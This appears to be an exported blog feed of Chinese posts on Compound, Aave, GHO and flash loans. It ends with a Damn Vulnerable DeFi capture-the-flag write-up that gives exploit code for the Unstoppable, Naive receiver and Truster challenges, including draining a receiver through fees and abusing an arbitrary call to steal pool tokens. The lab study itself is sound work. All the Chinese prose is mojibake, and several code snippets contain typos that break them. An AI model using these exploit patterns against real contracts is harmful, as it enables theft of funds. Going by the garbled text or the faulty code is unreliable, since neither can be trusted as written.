åªéœ€è¦çœ‹è‡ªå·±è¦å€Ÿå“ªä¸ªå¸ï¼Œä¸éœ€è¦å’Œåˆ«äººæ²Ÿé€šè¿˜æ¬¾æ—¥æœŸã€åˆ©ç‡ï¼Œå°±èƒ½é©¬ä¸Šå€Ÿé’±ã€‚å€Ÿæ¬¾æ˜¯å®æ—¶ä¸”å¯é¢„æµ‹çš„ã€‚æ¯ä¸ªè´§å¸å¸‚åœºéƒ½æœ‰ä¸€ä¸ªç”±å¸‚åœºå†³å®šçš„æµ®åŠ¨åˆ©ç‡ã€‚</p><h2 id="æ¸…ç®—ä¿è¯"><a href="#æ¸…ç®—ä¿è¯" class="headerlink" title="æ¸…ç®—ä¿è¯"></a>æ¸…ç®—ä¿è¯</h2><p>Compound åè®®å¼ºåˆ¶åº”ç”¨äº†ä¸€æ¡è§„åˆ™ï¼Œå³æ¯ä¸ªè´¦æˆ·å¿…é¡»æ‹¥æœ‰è¶³å¤Ÿçš„ä½™é¢èƒ½å¤Ÿå¿è¿˜å€Ÿæ¬¾çš„é¢åº¦ï¼Œå«åš<strong>æŠµæŠ¼ç‡</strong>ã€‚æ¯ä¸ªè´¦æˆ·æ— æ³•åšå‡ºä»»ä½•ä¼šä½¿ã€Œä½™é¢ï¼å€Ÿæ¬¾é¢åº¦ã€ä½äºã€ŒæŠµæŠ¼ç‡ã€çš„è¡Œä¸ºã€‚æ¯”å¦‚å†å€Ÿæ›´å¤šçš„é’±æˆ–è€…æŠŠæŠµæŠ¼æ¬¾çš„ä½™é¢æç°ã€‚è¦å¢å¤§æˆ–è€…é‡ç½®æŠµæŠ¼ç‡ï¼Œç”¨æˆ·å¯ä»¥å…¨é¢æˆ–è€…éƒ¨åˆ†å¿è¿˜å€Ÿæ¬¾ã€‚ä»»ä½•è¢« Compound æŒæœ‰çš„ä½™é¢ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç”¨æ¥åšæŠµæŠ¼å“çš„ä½™é¢ï¼ŒåŒæ—¶ä¹Ÿä¼šäº§ç”Ÿæ­£å¸¸çš„åº”è®¡åˆ©æ¯ã€‚</p><p>å¦‚æœä¸€ä¸ªç”¨æˆ·æä¾›çš„æŠµæŠ¼èµ„äº§ï¼Œé™¤ä»¥ä»–ä»¬ä¿¡ç”¨é¢åº¦æ‰€å€Ÿçš„æ¬¾é¡¹ï¼Œä½äºæŠµæŠ¼ç‡ï¼Œé‚£ä»–ä»¬çš„æŠµæŠ¼èµ„äº§å°±ä¼šï¼ˆé€šè¿‡å€Ÿæ¬¾èµ„äº§ï¼‰è¢«å‡ºå”®ï¼Œå‡ºå”®çš„ä»·æ ¼æ˜¯å½“å‰å¸‚åœºä»·æ ¼å‡å»æ¸…ç®—æŠ˜æ‰£ï¼ˆliquidation discountï¼‰ã€‚è¿™ä¸ªæœºåˆ¶ä¼šæ¿€åŠ±ç³»ç»Ÿé‡Œçš„å¥—åˆ©è€…ï¼Œå»å¿«é€Ÿå‡å°‘å€Ÿæ¬¾äººè¿˜ä¸äº†çš„å€Ÿæ¬¾èµ„äº§çš„çŸ­ç¼ºï¼Œä»è€Œé™ä½åè®®çš„é£é™©ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>å®ƒæ˜¯ Aave åè®®ä¸­å”¯ä¸€ä¸€ä¸ªå»ä¸­å¿ƒåŒ–ã€è¶…é¢æŠµæŠ¼çš„ç¨³å®šå¸ï¼Œä½œä¸ºä»¥å¤ªåŠä¸»ç½‘ä¸Šçš„å»ä¸­å¿ƒåŒ–ç¨³å®šå¸ï¼ŒGHO ç”±ç”¨æˆ·é“¸é€ ã€‚ä¸ Aave åè®®ä¸Šçš„æ‰€æœ‰å€Ÿè´·ä¸€æ ·ï¼Œç”¨æˆ·å¿…é¡»æä¾›æŠµæŠ¼å“ï¼ˆæŒ‰ç‰¹å®šæŠµæŠ¼å“æ¯”ç‡ï¼‰æ‰èƒ½é“¸é€  GHOã€‚ç›¸åº”åœ°ï¼Œå½“ç”¨æˆ·å¿è¿˜å€Ÿè´·å¤´å¯¸ï¼ˆæˆ–è¢«æ¸…ç®—ï¼‰æ—¶ï¼ŒGHO å°†è¿”å› Aave æ± å¹¶è¢«é”€æ¯ã€‚GHO é“¸é€ è€…ç´¯ç§¯çš„æ‰€æœ‰åˆ©æ¯æ”¯ä»˜å°†ç›´æ¥è¿›å…¥Aave DAO é‡‘åº“ï¼Œè¿™ä¸ç”¨æˆ·å€Ÿå…¥å…¶ä»–èµ„äº§æ—¶æ”¶é›†çš„æ ‡å‡†å‡†å¤‡é‡‘å› å­å½¢æˆé²œæ˜å¯¹æ¯”ï¼Œæœ¬é‡‘å°†è¢«é”€æ¯ã€‚</p><p>äººä»¬å¯¹çœŸæ­£å»ä¸­å¿ƒåŒ–ã€è¶…é¢æŠµæŠ¼å’Œå¯é…ç½®çš„ç¨³å®šå¸çš„éœ€æ±‚å¾ˆå¤§ã€‚æœ€è¿‘çš„äº‹ä»¶è¯æ˜äº†å»ä¸­å¿ƒåŒ–ç¨³å®šå¸åœ¨å¸‚åœºæ³¢åŠ¨æœŸé—´ç»´æŒç¨³å®šä»·å€¼çš„ç”¨ä¾‹ã€‚GHO æ˜¯ä¸€ç§ç”± Aave Governance æ§åˆ¶çš„ç¨³å®šå¸ï¼Œåœ¨ç¤¾åŒºæ”¯æŒä¸‹ï¼Œå®ƒæœ‰æ½œåŠ›æˆä¸º DeFi ç”Ÿæ€ç³»ç»ŸæŒç»­å¢é•¿ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚</p><p>ä¸è®¸å¤šç¨³å®šå¸ä¸åŒï¼ŒGHO çš„é¢„è¨€æœºä»·æ ¼æ˜¯å›ºå®šçš„ã€‚GHO ç­‰å»ä¸­å¿ƒåŒ–ç¨³å®šå¸æ˜¯é€æ˜çš„ï¼Œæ— æ³•æ›´æ”¹ã€‚åˆ©ç‡ç”± Aave DAO å®šä¹‰ï¼Œå¿è¿˜çš„åˆ©æ¯å°†é‡å®šå‘åˆ° DAO è€Œä¸æ˜¯èµ„äº§ä¾›åº”å•†ã€‚åœ¨å®‰å…¨æ¨¡å—ä¸­è´¨æŠ¼ AAVE çš„å€Ÿæ¬¾äººå¯äº«å—æŠ˜æ‰£ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aaveå­¦ä¹ çŸ¥è¯†</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>æ˜¯ä¸€ç§å®Œå…¨å»ä¸­å¿ƒåŒ–çš„ã€ç¤¾åŒºç®¡ç†çš„åè®®ï¼ŒAave æ˜¯èŠ¬å…°è¯­ï¼Œæ„æ€æ˜¯â€œå¹½çµâ€ï¼Œæœ€åˆäº 2017 å¹´ 11 æœˆæ¨å‡ºæ—¶è¢«ç§°ä¸º ETHLendã€‚ ETHLend æ˜¯ä¸€ä¸ªç‚¹å¯¹å¯¹ç‚¹å€Ÿè´·ç³»ç»Ÿã€‚åæ¥è¿›è¡Œæ”¹è¿›æ‰æ˜¯Aaveï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­å€Ÿå…¥å’Œå€Ÿå‡ºåŠ å¯†èµ„äº§ã€‚åè®®çš„ä»·å€¼ä¸»å¼ æ˜¯åˆ›å»ºä¸€ä¸ªå¯ä¾›ä»»ä½•æ‹¥æœ‰åŠ å¯†èµ„äº§çš„äººä½¿ç”¨çš„æ›¿ä»£å»ä¸­å¿ƒåŒ–èµ„äº§è´§å¸å¸‚åœºã€‚</p><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>Aave æ˜¯ä¸€ä¸ªå€Ÿè´·æ± ç³»ç»Ÿï¼Œä½¿ç”¨æˆ·å¯ä»¥é€‰æ‹©å€Ÿå…¥ã€å€Ÿå‡ºå’Œèµšå– 20 ç§ä¸åŒæ•°å­—èµ„äº§çš„åˆ©æ¯ï¼Œè€Œæ— éœ€ä¸­é—´äººã€‚</p><p>æƒ³è¦èµšå–åˆ©æ¯çš„ç”¨æˆ·å°†å­˜å…¥ä»–ä»¬æƒ³è¦å€Ÿå‡ºçš„èµ„é‡‘ï¼Œç„¶åå°†å…¶æ”¶é›†åˆ°æµåŠ¨æ€§æ± ä¸­ã€‚å½“å€Ÿæ¬¾äººè´·æ¬¾æ—¶ï¼Œä»–ä»¬ä»è¿™äº›èµ„é‡‘æ± ä¸­æå–èµ„é‡‘ã€‚è´·æ–¹å¯ä»¥ä»¥ä»»ä½•ä»–ä»¬è®¤ä¸ºåˆé€‚çš„æ–¹å¼äº¤æ˜“æˆ–è½¬è®©è¿™äº›ä»£å¸ã€‚</p><p>Aave å‘è¡Œä¸¤ç§ç±»å‹çš„ä»£å¸æ¥ä¿ƒè¿›æ­¤æ´»åŠ¨ï¼Œ$AAVEï¼ˆåŸç”Ÿä»£å¸ï¼‰å’Œ aTokensã€‚<br>$AAVE ä»¤ç‰Œæœ‰å¤šç§ä½¿ç”¨æ–¹å¼ï¼š<br>1ï¼Œå¦‚æœæ”¯ä»˜è´¹ç”¨ï¼Œ$AAVE çš„æ‰€æœ‰è€…å¯ä»¥é€‰æ‹©åœ¨å‘å…¬ä¼—å‘å¸ƒè´·æ¬¾ä¹‹å‰æŸ¥çœ‹è´·æ¬¾ã€‚</p><p>2ï¼Œ ä½¿ç”¨ $AAVE ä½œä¸ºæŠµæŠ¼å“çš„ç”¨æˆ·å¯ä»¥æ¯”ä½¿ç”¨ä»»ä½•å…¶ä»–æ•°å­—èµ„äº§å€Ÿå…¥çš„é‡‘é¢ç•¥å¤šã€‚</p><p>3ï¼Œä»£å¸æŒæœ‰è€…å¯ä»¥åœ¨å¹³å°ä¸Šè´¨æŠ¼ $AAVEï¼Œä»¥è·å¾—å¤§çº¦ 6% çš„ APY åˆ†é…ã€‚</p><p>aTokens ä»£å¸ï¼š</p><p>1ï¼Œè¿™äº›ä»£å¸åœ¨å­˜æ¬¾æ—¶é“¸é€ ï¼Œèµå›æ—¶é”€æ¯ã€‚</p><p>2ï¼Œå®ƒä»¬ä¸å­˜å…¥ Aave åè®®çš„åŸºç¡€èµ„äº§çš„ä»·å€¼ä»¥ 1:1 çš„æ¯”ç‡æŒ‚é’©ã€‚</p><p>3ï¼ŒaTokens ä¸ºè´·æ–¹æä¾›â€œæ”¶æ®â€ï¼Œå…è®¸ä»–ä»¬æ”¶å–å­˜æ¬¾åˆ©æ¯ã€‚</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>ä»Šå¹´ï¼ˆ2024ï¼‰5æœˆï¼ŒAvara å…¬å¸ƒ Aave V4 ç‰ˆæœ¬çš„å‡çº§è®¡åˆ’ï¼Œé‡ç‚¹æ”¾åœ¨è¿›ä¸€æ­¥æå‡ Aave çš„æµåŠ¨æ€§ä¸èµ„äº§åˆ©ç”¨ç‡ã€‚Aave V4 ç‰ˆæœ¬å¼•å…¥äº†æµåŠ¨æ€§æº¢ä»·åŠŸèƒ½ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ¹æ®æŠµæŠ¼å“é£é™©çŠ¶å†µè°ƒæ•´å€Ÿæ¬¾åˆ©ç‡ã€‚ä¸ºæ¯ç§èµ„äº§åˆ†é…é£é™©å› å­ï¼Œä¾æ®å¸‚åœºå’Œå¤–éƒ¨é£é™©å› ç´ åŠ¨æ€è°ƒæ•´ã€‚é£é™©è¾ƒä½çš„èµ„äº§ï¼ˆå¦‚ä»¥å¤ªåŠï¼‰ï¼Œå°†äº«å—æ›´ä½çš„å€Ÿè´·åˆ©ç‡ï¼Œè€Œé£é™©è¾ƒé«˜çš„èµ„äº§ï¼ˆå¦‚å±±å¯¨å¸ï¼‰åˆ™ç›¸å¯¹æé«˜å€Ÿè´·æˆæœ¬ã€‚</p><p>Aave V4 ç‰ˆæœ¬é€šè¿‡å¼•å…¥ä¸€ç³»åˆ—åˆ›æ–°åŠŸèƒ½ï¼Œä¼˜åŒ–äº†å€Ÿè´·ç›¸å…³çš„å®‰å…¨æ€§ä¸ç”¨æˆ·ä½“éªŒå¹¶ç®€åŒ–äº†æ²»ç†æµç¨‹ï¼š</p><ul><li><p>æ™ºèƒ½è´¦æˆ·å’Œé‡‘åº“çš„è®¾è®¡å¤§å¹…æå‡äº†ç”¨æˆ·ä½“éªŒï¼Œæ™ºèƒ½è´¦æˆ·å…è®¸ç”¨æˆ·é€šè¿‡å•ä¸€é’±åŒ…ç®¡ç†å¤šä¸ªä»“ä½ã€‚è€Œæ™ºèƒ½è´¦æˆ·å®ç°çš„é‡‘åº“åŠŸèƒ½å…è®¸ç”¨æˆ·ä¸ç›´æ¥å‘æµåŠ¨æ€§å±‚æä¾›æŠµæŠ¼å“çš„æƒ…å†µä¸‹å€Ÿæ¬¾ï¼ŒæŠµæŠ¼å“å°†åœ¨å€Ÿæ¬¾æ´»è·ƒæˆ–æ¸…ç®—äº‹ä»¶å‘ç”Ÿæ—¶è¢«é”å®šï¼Œå¢åŠ äº†ç”¨æˆ·äº¤äº’çš„ä¾¿æ·æ€§å’Œå®‰å…¨æ€§ã€‚</p></li><li><p>V4 ç‰ˆæœ¬è¿˜æå‡ºäº†åŠ¨æ€é£é™©é…ç½®ï¼Œä»¥åœ¨å¸‚åœºæ¡ä»¶å˜åŒ–æ—¶è°ƒæ•´é£é™©å‚æ•°ã€‚ç”¨æˆ·åœ¨å€Ÿæ¬¾æ—¶ä¼šä¸èµ„äº§çš„å½“å‰é…ç½®å…³è”ï¼Œè€Œæ–°çš„èµ„äº§é…ç½®åˆ™ä¸ºæ–°ç”¨æˆ·æä¾›ï¼Œé¿å…äº†å½±å“ç°æœ‰å€Ÿæ¬¾äººã€‚æ­¤å¤– V4 å¼•å…¥äº†è‡ªåŠ¨é€€å¸‚æœºåˆ¶ï¼Œç®€åŒ–äº†èµ„äº§ä¸‹æ¶è¿‡ç¨‹ã€‚</p></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¯”é“¶è¡Œæ›´é«˜çº§çš„é“¶è¡Œï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªpool,åœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œå­˜æ¬¾ä¸å€Ÿæ¬¾ï¼Œæ–¹ä¾¿ï¼Œä¿¡ä»»åº¦é«˜,ä½œä¸ºå»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰å€Ÿè´·é¢†åŸŸçš„é¢†å¤´ç¾Šï¼ŒAave åœ¨èµ„äº§åˆ©ç”¨ç‡ã€å¸‚åœºå æœ‰ç‡å’Œäº¤æ˜“é‡æ–¹é¢å‡æ˜¾è‘—é¢†å…ˆäºç«äº‰å¯¹æ‰‹ï¼Œæ‰®æ¼”ç€å…³é”®è§’è‰²ã€‚ç„¶è€Œï¼ŒAave çš„é¢†å…ˆåœ°ä½å¹¶éä¸å¯åŠ¨æ‘‡ã€‚åè®®å¦‚ Radiant å’Œ Compound å·²å±•ç¤ºå‡ºå¼ºåŠ²çš„å¢é•¿æ½œåŠ›ï¼Œå¹¶æ¨å‡ºäº†å…·æœ‰å¢é•¿æ½œåŠ›çš„æ–°ç‰ˆæœ¬ã€‚ä¸ºäº†å·©å›ºå…¶å¸‚åœºåœ°ä½ï¼ŒAave å¯ä»¥é‡‡å–ä»¥ä¸‹ç­–ç•¥ï¼šåŠ å¼ºå…¶æ ¸å¿ƒå€Ÿè´·ä¸šåŠ¡ï¼Œæ¨åŠ¨ GHO çš„è¿›ä¸€æ­¥å‘å±•å¹¶äº Aave å……åˆ†èåˆï¼Œå»ºç«‹ V4 ç‰ˆæœ¬æ‰€è®¾è®¡çš„ Aave Network ï¼Œä»¥åŠæ‹“å±•å…¶éå€Ÿè´·ä¸šåŠ¡ç”Ÿæ€ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é—ªç”µè´·</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="é—ªç”µè´·"><a href="#é—ªç”µè´·" class="headerlink" title="é—ªç”µè´·"></a>é—ªç”µè´·</h1><p>é—ªç”µè´·ï¼ˆFlash loanï¼‰ï¼šæ˜¯ä¸€ç§æ— æŠµæŠ¼ã€å€Ÿè´·é‡‘é¢æ— ä¸Šé™ï¼ˆå¯ä»¥å€Ÿå…‰æ± ä¸­æ‰€æœ‰çš„é’±ï¼‰çš„è´·æ¬¾ã€‚å®ƒè¦æ±‚å€Ÿè´·äººå¿«å€Ÿå¿«è¿˜ï¼Œå¿«åˆ°è¿˜æ¬¾å’Œå€Ÿæ¬¾åœ¨åŒä¸€ä¸ªäº¤æ˜“å†…ï¼ˆåŒä¸€ä¸ªä»¥å¤ªåŠ transaction),åœ¨æˆ‘çœ‹æ¥å°±æ˜¯éå¸¸è¿…é€Ÿçš„å€Ÿæ¬¾è¿˜æ¬¾</p><p>é¦–å…ˆä½ è¦å€Ÿé’±çš„è¯ï¼Œä½ è¦å†™ä¸ªè¿˜é’±åˆçº¦ï¼Œé‡Œé¢åŒ…æ‹¬äº†å¦‚ä½•èµšé’±ï¼Œè¿˜æœ¬é‡‘åŠ åˆ©æ¯çš„æ•°ç›®ï¼Œå¼€å§‹å€Ÿæ¬¾çš„è¯ï¼Œå°±è¦å®ç°ä¸€ä¸ªflashloan()é—ªç”µè´·åˆçº¦ï¼Œè¿™ä¸ªåˆçº¦é¦–å…ˆè¦å…ˆè¿›è¡Œä¸€ç³»åˆ—çš„æ•°æ®éªŒè¯ï¼Œå†è°ƒç”¨ä½ çš„è¿˜é’±åˆçº¦ï¼ŒéªŒè¯ä½ æ˜¯å¦è¿˜äº†æœ¬é‡‘åŠ åˆ©æ¯ï¼Œå¦‚æœæ²¡æœ‰è¿˜ä¸Šï¼Œç›´æ¥ revert æ•´ä¸ªäº¤æ˜“ï¼Œè®©å€Ÿæ¬¾æ— æ•ˆï¼Œä»è€Œä¿è¯å€Ÿå‡ºæ–¹æ€»æ˜¯å®‰å…¨çš„ã€‚å®ç°é—ªç”µè´·é€šå¸¸æœ‰ä¿©ä¸ªåˆçº¦ã€‚</p><p>é—ªç”µè´·çš„ä¼˜ç‚¹ï¼šç¼–å†™é—ªç”µè´·åˆçº¦æ€»ä½“å¹¶ä¸å¤æ‚ã€‚ä½¿ç”¨é—ªç”µè´·é£é™©ä¹Ÿæ¯”è¾ƒå°ã€‚å¦‚æœèµšé’±é€»è¾‘å¤±è´¥ï¼Œå˜æˆäº†äºé’±é€»è¾‘ï¼Œä¸èƒ½å®Œæˆè¿˜æ¬¾ï¼Œé‚£ä¹ˆä¹Ÿä¸ç”¨æ‹…å¿ƒå€Ÿæ¥çš„å·¨æ¬¾æ— åŠ›å¿è¿˜ã€‚æ•´ä¸ªäº¤æ˜“å°†ä¼šæ‰§è¡Œå¤±è´¥ï¼Œå°±å¦‚åŒå€Ÿæ¬¾ä»æ¥æ²¡æœ‰å‘ç”Ÿè¿‡ä¸€æ ·ã€‚</p><p><a href="https://www.learnblockchain.cn/article/1926">å®ç°ä½ ç¬¬ä¸€ç¬”é—ªç”µè´·åˆçº¦</a><br><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">é—ªç”µè´·çš„æç®€å…¥é—¨</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defié¢˜è§£</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>è¦æ±‚æ˜¯ï¼Œä½¿æ‹¥æœ‰ä¸€ç™¾ä¸‡DVIçš„é’±åŒ…åœæ­¢é—ªç”µè´·çš„åŠŸèƒ½</p><p>åˆ†æï¼šè¿™ä¸ªåˆçº¦çš„ä»£ç åœ¨gittubä¸Šï¼Œè¦åˆ†å¼€å»çœ‹ï¼Œè¿™é“é¢˜çš„è§£å†³å°±æ˜¯é ä¸€ä¸ªåŸºæœ¬çš„é—ªç”µè´·çš„çŸ¥è¯†<br>é¦–å…ˆè¦çœ‹é—ªç”µè´·çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revertçš„å…³é”®ï¼š  <code>convertToShares(totalSupply) != balanceBefore</code>ï¼Œé¦–å…ˆæ¥çœ‹è¿™ä¸ªtotalSupply,å¾ˆç†Ÿæ‚‰ï¼Œåœ¨ERC20ä¸­è§è¿‡ï¼Œåˆæ•´ä½“çœ‹è¿™ä¸ªåˆçº¦ï¼Œå…¶å®æ˜¯ç»§æ‰¿äº†ERC20ï¼ŒtotalSupplyåœ¨ERC4626ä¸­å®šä¹‰äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626éƒ¨åˆ†åˆçº¦</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()ï¼šè®¡ç®—çš„æ˜¯å½“å‰é‡‘åº“ä¸­çš„èµ„äº§ä»£å¸æ•°ç›®</li><li>convertToShares(totalSupply)ï¼štotalSupply æ˜¯æ€»çš„ share ä»£å¸æ•°ç›®ï¼ˆåªæœ‰ deposit æˆ– mint æ—¶æ‰ä¼šäº§ç”Ÿï¼‰ï¼ŒconvertToShares å°±æ˜¯è®¡ç®—ï¼šassets * totalSupply &#x2F;totalAssets ()</li></ul><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° supply&#x3D;assets*supply&#x2F;talalAssets(),å¦‚æœæˆ‘ä»¬è®©talalAssets()æ€»æ•°å¢åŠ ï¼Œè€Œassetsä¸å˜ï¼Œå°±èƒ½æ»¡è¶³convertToShares(totalSupply) !&#x3D; balanceBeforeï¼Œæ‰€ä»¥å°±åªè¦ä¸é€šè¿‡ depost æˆ– mint æ–¹æ³•å‘ UnstoppableVault ä¸­è½¬å…¥ token å³å¯</p><p>æ–¹æ³•ï¼šåœ¨<strong>Unstoppable.t.sol</strong>æµ‹è¯•åˆçº¦ä¸­å†™æˆ‘ä»¬çš„æ”»å‡»åˆçº¦,è®°å¾—æ‰¾å¯¹ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>è¦æ±‚æ˜¯ï¼Œæç©ºä¸€ä¸ªç”¨æˆ·å·²ç»éƒ¨ç½²çš„åˆçº¦ä¸Šçš„ETH</p><p>åˆ†æï¼Œéƒ¨ç½²åˆçº¦ï¼Œpoolçš„é—ªç”µè´·æ‰‹ç»­è´¹ä¸º1eth,receiverå·²ç»æœ‰äº†10eth,è¦ä½¿ receiver ä¸­çš„ä½™é¢ä¸º 0ï¼Œpool ä¸­çš„ä½™é¢ä¸º 1000+10ethï¼Œå°±æ˜¯å› æ­¤åªéœ€é€šè¿‡ receiver å‘ pool æ‰§è¡Œåæ¬¡é—ªç”µè´·å³å¯æŠŠ 10eth å…¨éƒ¨é€šè¿‡æ‰‹ç»­è´¹çš„æ–¹å¼è½¬ç»™ pool</p><p>æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>è¦æ±‚æ˜¯ï¼Œè·å–è¿™ä¸ªæ± ä¸­çš„å…¨éƒ¨DIV</p><p>åˆ†æï¼šçœ‹æ•´ä¸ªåˆçº¦ï¼Œè¿˜æ˜¯æŒºç®€å•çš„ï¼Œä¹Ÿæ˜“è¯»æ˜“æ‡‚ï¼ŒflashLoanåˆçº¦ä¸­ï¼Œå®ç°äº†ç®€å•çš„åˆçº¦ä»£ç ï¼Œæ‰§è¡Œå›è°ƒçš„å‡½æ•°å°±æ˜¯ target.functionCall(data);ä¸»è¦ä»è¿™ä¸ªå…¥æ‰‹ï¼Œæ”»å‡»åˆçº¦å¦‚ä¸‹ï¼š</p><pre><code>pragam solidityb ^0.8.0;import&quot;./TusterLenderPool.sol&quot;;import&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;interface ITusterLenderPool&#123;    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data);&#125;contract TusterExploit&#123;   ITusterlenerPool cons;   address pool;   uint256 balanceof;   address tokenaddress;   constractor (address _pool,address _tokenaddress,uint256 Balanceof)   &#123;    cons = ITusterLenderPool(_pool);    pool = _pool;    tokenaddress = _tokenaddress;    balanceof = Balanceof;   &#125;   function hack() public &#123;    cons.flashLoan(0,msg.sender,tokenaddress,abi.codeWithSigner(&quot;appove(address,uint256)&quot;,address(this),balanceof));    IERC20 token  = IERC20(tokenaddress);    token.transferFrom(pool,msg.sender,balanceof);   &#125;&#125;pragma solidity ^0.8.0;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
